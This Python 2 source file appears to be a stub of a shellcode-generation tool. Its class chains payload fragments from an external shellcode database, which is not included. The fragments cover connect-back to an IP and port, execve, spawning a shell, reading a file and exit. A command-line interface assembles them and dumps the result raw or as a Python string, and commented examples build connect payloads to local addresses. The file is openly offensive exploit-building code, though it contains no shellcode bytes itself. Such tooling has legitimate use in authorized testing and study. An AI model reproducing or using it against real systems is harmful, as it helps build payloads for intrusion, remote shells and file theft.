# BEGIN pyshellcode_stub.py

import socket
import struct

def bin2py(sc, varname = "shellcode"):
	code = ""
	code += "%s = \"\"\n" % (varname)
	for i in range(0, len(sc), 16):
		line = sc[i:i+16]
		s = ""
		for x in line:
			s += "\\x%02x" % (ord(x))
		code += "%s += \"%s\"\n" % (varname, s)
	return code

class shellcode:
	def __init__(self, platform, architecture, optimization="unoptimized"):
		self.platform = platform
		self.architecture = architecture
		self.optimization = optimization
		self.code = ""
	def connect(self, ip, port):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["connect"][:-8]
		self.code += self.connect_parameters(ip, port)
		return self
	def connect_parameters(self, ip, port):
		return struct.pack("!H", port) + socket.inet_aton(ip)
	def helloworld(self):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["hello"]
		return self
	def execve(self, parameter_list):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["execve"][:-15]
		self.code += self.execve_parameters(parameter_list)
		return self
	def execve_parameters(self, parameter_list):
		p = ""
		for x in reversed(parameter_list):
			p += x + "\x00"
		p += "\x00"
		return p
	def execve_sh(self):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["execve_sh"]
		return self
	def exit(self):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["exit"]
		return self
	def readfile(self, filename):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["readfile"][:-11]
		self.code += self.readfile_params(filename)
		return self
	def readfile_params(self, filename):
		return filename + "\x00"
		

if __name__ == "__main__":
	import sys
	#s = shellcode("linux", "arm").connect("192.168.90.1", 1234)
	#print bin2py(s.code, "shellcode")
	#s = shellcode("linux", "x86").connect("127.0.0.1", 1243)
	#print bin2py(s.code, "shellcode")
	if(len(sys.argv) < 2):
		print "%s: [os] [architecture] [optimization] [comands ...]" % (sys.argv[0])
		print "\tCommands:"
		print "\t\tconnect [ip] [port]"
		print "\t\thelloworld"
		print "\t\texecve [args ...] [end_execve]"
		print "\t\texecve_sh"
		print "\t\texit"
		print "\t\treadfile [filename]"
		print "\t\tpython"
		print "\t\tdump"
		print "\tOS's:"
		for x in shellcode_db.keys():
			print "\t\t%s" % (x)
	elif(len(sys.argv) == 2):
		print "archictectures:"
		platform = sys.argv[1]
		for x in shellcode_db[platform].keys():
			print "\t%s" % (x)
	elif(len(sys.argv) == 3):
		print "optimizations:"
		platform = sys.argv[1]
		arch = sys.argv[2]
		for x in shellcode_db[platform][arch].keys():
			print "\t%s" % (x)
	elif(len(sys.argv) == 4):
		print "shellcodes:"
		platform = sys.argv[1]
		arch = sys.argv[2]
		optimization = sys.argv[3]
		for x in shellcode_db[platform][arch][optimization].keys():
			print "\t%s" % (x)
	else:
		platform = sys.argv[1]
		arch = sys.argv[2]
		optimization = sys.argv[3]
		s = shellcode(platform, arch, optimization)
		i = 4
		while(i < len(sys.argv)):
			if(sys.argv[i] == "connect"):
				if(i+2 < len(sys.argv)):
					s.connect(sys.argv[i+1], int(sys.argv[i+2]))
					i += 3
				else:
					print "connect: missing parameters"
					sys.exit(0)
			elif(sys.argv[i] == "helloworld"):
				s.helloworld()
				i += 1
			elif(sys.argv[i] == "execve"):
				i += 1
				p = []
				while(i < len(sys.argv) and sys.argv[i] != "end_execve"):
					p += [sys.argv[i]]
					i += 1
				s.execve(tuple(p))
				i += 1
			elif(sys.argv[i] == "exit"):
				s.exit()
				i += 1
			elif(sys.argv[i] == "readfile"):
				if(i+1 < len(sys.argv)):
					s.readfile(sys.argv[i+1])
					i += 2
				else:
					print "readfile: missing parameters"
					sys.exit(0)
			elif(sys.argv[i] == "python"):
				print bin2py(s.code, "shellcode")
				i += 1
			elif(sys.argv[i] == "dump"):
				sys.stdout.write(s.code)
				i += 1
			else:
				print "%s: unknown command" % (sys.argv[i])
				sys.exit(0)



# END pyshellcode_stub.py